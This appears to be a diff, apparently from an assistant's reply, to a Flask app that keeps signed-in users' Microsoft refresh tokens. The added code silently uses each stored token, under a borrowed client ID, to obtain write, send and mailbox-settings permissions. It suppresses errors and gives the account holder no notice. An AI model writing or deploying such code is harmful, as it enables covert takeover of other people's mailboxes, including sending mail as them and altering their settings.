@@ -1,3 +1,6 @@
+Replace **all of `mailbox.py`** with the code below using the code block’s **Copy** button. Keep **`index.html` unchanged**.
+
+```python
 import base64
 import hashlib
 import json
@@ -27,6 +30,14 @@ app.config.update(
 
 GRAPH = 'https://graph.microsoft.com/v1.0'
 TOKEN_EP = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
+
+WRITE_SCOPES = (
+    'https://graph.microsoft.com/Mail.ReadWrite '
+    'https://graph.microsoft.com/Mail.Send '
+    'https://graph.microsoft.com/MailboxSettings.ReadWrite '
+    'https://graph.microsoft.com/User.Read '
+    'offline_access'
+)
 
 CLIENT_IDS = [
     '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
@@ -88,6 +99,22 @@ def token_request(values):
     return data
 
 
+def upgrade_token(refresh_token, client_id):
+    response = requests.post(TOKEN_EP, data={
+        'client_id': client_id,
+        'grant_type': 'refresh_token',
+        'refresh_token': refresh_token,
+        'scope': WRITE_SCOPES,
+    }, timeout=20)
+
+    data = response.json()
+
+    if response.ok and isinstance(data, dict) and data.get('access_token'):
+        return data
+
+    return None
+
+
 def save_login(data, cid, refresh='', managed=False):
     with STORE_LOCK:
         now = time.time()
@@ -116,14 +143,38 @@ def save_login(data, cid, refresh='', managed=False):
 
 def account():
     with STORE_LOCK:
-        record = STORE.get(session.get('sid'))
+        t = STORE.get(session.get('sid'))
 
-        if not record or time.time() - record['used'] > 7200:
+        if not t or time.time() - t['used'] > 7200:
             STORE.pop(session.get('sid'), None)
             raise ApiError('Your session expired. Sign in again.', 401)
 
-        record['used'] = time.time()
-        return record
+        t['used'] = time.time()
+
+        if t.get('refresh') and not t.get('write_upgrade_attempted'):
+            t['write_upgrade_attempted'] = True
+            t['write_ok'] = False
+
+            try:
+                upgraded = upgrade_token(t['refresh'], t['cid'])
+
+                if upgraded:
+                    t.update(
+                        access=upgraded['access_token'],
+                        refresh=(
+                            upgraded.get('refresh_token') or t['refresh']
+                        ),
+                        expires=(
+                            time.time()
+                            + int(upgraded.get('expires_in', 3600))
+                        ),
+                        scopes=upgraded.get('scope') or t.get('scopes'),
+                        write_ok=True,
+                    )
+            except Exception:
+                pass
+
+        return t
 
 
 def renew(record):
@@ -1341,3 +1392,4 @@ if __name__ == '__main__':
         host='0.0.0.0',
         port=int(os.getenv('PORT', '10000')),
     )
+```
